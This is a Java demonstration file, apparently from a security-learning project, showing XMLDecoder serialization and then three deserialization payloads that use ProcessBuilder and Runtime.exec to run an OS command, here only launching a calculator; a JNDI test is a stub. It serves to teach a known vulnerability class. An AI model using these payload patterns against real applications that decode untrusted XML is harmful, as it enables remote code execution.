package icu.secnotes.test;

import icu.secnotes.pojo.Person;
import java.beans.XMLDecoder;
import java.beans.XMLEncoder;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

public class XMLDecoderTest {
    public static void main(String[] args) throws Exception {
        // 测试基本的序列化和反序列化功能
        ObjectXMLDecoderTest();
        
        // 测试恶意payload执行系统命令
        EvilObjectXMLDecoderTest();
    }

    private static void ObjectXMLDecoderTest() throws IOException {
        // 创建Person实例
        Person person = new Person();
        person.setName("张三");
        person.setAge(25);
        
        System.out.println("原始Person对象: " + person);
        
        // 序列化Person对象为XML字符串
        String xmlStr = serializeToXML(person);
        System.out.println("序列化结果:");
        System.out.println(xmlStr);
        
        // 反序列化XML字符串为Person对象
        Person deserializedPerson = deserializeFromXML(xmlStr);
        System.out.println("反序列化结果: " + deserializedPerson);
        System.out.println("反序列化的Person对象名：" + deserializedPerson.getName());
        
        // 验证序列化和反序列化是否成功
        System.out.println("序列化/反序列化测试: " + 
            (person.getName().equals(deserializedPerson.getName()) && 
             person.getAge().equals(deserializedPerson.getAge()) ? "成功" : "失败"));
    }

    /**
     * 将对象序列化为XML字符串
     */
    private static String serializeToXML(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        XMLEncoder encoder = new XMLEncoder(baos);
        
        try {
            encoder.writeObject(obj);
            encoder.flush();
            System.out.println("[[[[[]]]]]");
            System.out.println(baos.toString("UTF-8"));
            System.out.println("[[[[[]]]]]");
            return baos.toString("UTF-8");
        } finally {
            encoder.close();
            baos.close();
        }
    }

    /**
     * 从XML字符串反序列化对象
     */
    private static <T> T deserializeFromXML(String xmlStr) throws IOException {
        ByteArrayInputStream bais = new ByteArrayInputStream(xmlStr.getBytes("UTF-8"));
        XMLDecoder decoder = new XMLDecoder(bais);
        
        try {
            @SuppressWarnings("unchecked")
            T result = (T) decoder.readObject();
            return result;
        } finally {
            decoder.close();
            bais.close();
        }
    }

    /**
     * 恶意payload测试方法 - 执行系统命令
     */
    private static void EvilObjectXMLDecoderTest() {
        System.out.println("\n=== XMLDecoder恶意payload测试 ===");
        
        // 测试1: 使用ProcessBuilder执行系统命令
        testProcessBuilderCommand();
        
        // 测试2: 使用Runtime.exec执行系统命令
        testRuntimeExecCommand();
        
        // 测试3: 通用命令执行测试
        testGenericCommandExecution();
        
        // 测试4: 使用JNDI注入（预留）
        testJNDIInjection();
    }

    /**
     * 测试使用ProcessBuilder执行系统命令
     */
    private static void testProcessBuilderCommand() {
        System.out.println("\n--- 测试1: ProcessBuilder命令执行 ---");
        
        // 恶意XML payload，使用ProcessBuilder执行系统命令
        String maliciousXML = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
            "<java>" +
            "  <object class=\"java.lang.ProcessBuilder\">" +
            "    <array class=\"java.lang.String\" length=\"3\">" +
            "      <void index=\"0\">" +
            "        <string>open</string>" +
            "      </void>" +
            "      <void index=\"1\">" +
            "        <string>-a</string>" +
            "      </void>" +
            "      <void index=\"2\">" +
            "        <string>Calculator</string>" +
            "      </void>" +
            "    </array>" +
            "    <void method=\"start\"/>" +
            "  </object>" +
            "</java>";
        
        System.out.println("恶意XML Payload:");
        System.out.println(maliciousXML);
        
        try {
            System.out.println("开始执行恶意payload...");
            Object result = deserializeFromXML(maliciousXML);
            System.out.println("恶意payload执行结果: " + result);
            System.out.println("返回对象类型: " + (result != null ? result.getClass().getName() : "null"));
        } catch (Exception e) {
            System.out.println("恶意payload执行异常: " + e.getMessage());
            e.printStackTrace();
        }
    }

    /**
     * 测试使用Runtime.exec执行系统命令
     */
    private static void testRuntimeExecCommand() {
        System.out.println("\n--- 测试2: Runtime.exec命令执行 ---");
        
        // 恶意XML payload，使用Runtime.exec执行系统命令
        String maliciousXML = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
            "<java>" +
            "  <object class=\"java.lang.Runtime\" method=\"getRuntime\">" +
            "    <void method=\"exec\">" +
            "      <string>open -a Calculator</string>" +
            "    </void>" +
            "  </object>" +
            "</java>";
        
        System.out.println("恶意XML Payload:");
        System.out.println(maliciousXML);
        
        try {
            System.out.println("开始执行恶意payload...");
            Object result = deserializeFromXML(maliciousXML);
            System.out.println("恶意payload执行结果: " + result);
            System.out.println("返回对象类型: " + (result != null ? result.getClass().getName() : "null"));
        } catch (Exception e) {
            System.out.println("恶意payload执行异常: " + e.getMessage());
            e.printStackTrace();
        }
    }

    /**
     * 测试通用命令执行
     */
    private static void testGenericCommandExecution() {
        System.out.println("\n--- 测试3: 通用命令执行 ---");
        
        // 根据操作系统选择不同的命令
        String os = System.getProperty("os.name").toLowerCase();
        String command;
        
        if (os.contains("win")) {
            // Windows系统
            command = "calc";
        } else if (os.contains("mac")) {
            // macOS系统
            command = "open -a Calculator";
        } else {
            // Linux系统
            command = "xcalc";
        }
        
        System.out.println("检测到操作系统: " + os);
        System.out.println("将执行命令: " + command);
        
        // 构建恶意XML payload
        String maliciousXML = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
            "<java>" +
            "  <object class=\"java.lang.Runtime\" method=\"getRuntime\">" +
            "    <void method=\"exec\">" +
            "      <string>" + command + "</string>" +
            "    </void>" +
            "  </object>" +
            "</java>";
        
        System.out.println("恶意XML Payload:");
        System.out.println(maliciousXML);
        
        try {
            System.out.println("开始执行恶意payload...");
            Object result = deserializeFromXML(maliciousXML);
            System.out.println("恶意payload执行结果: " + result);
            System.out.println("返回对象类型: " + (result != null ? result.getClass().getName() : "null"));
        } catch (Exception e) {
            System.out.println("恶意payload执行异常: " + e.getMessage());
            e.printStackTrace();
        }
    }

    /**
     * 测试JNDI注入（预留）
     */
    private static void testJNDIInjection() {
        System.out.println("\n--- 测试4: JNDI注入（预留） ---");
        System.out.println("JNDI注入测试功能待实现...");
    }
} 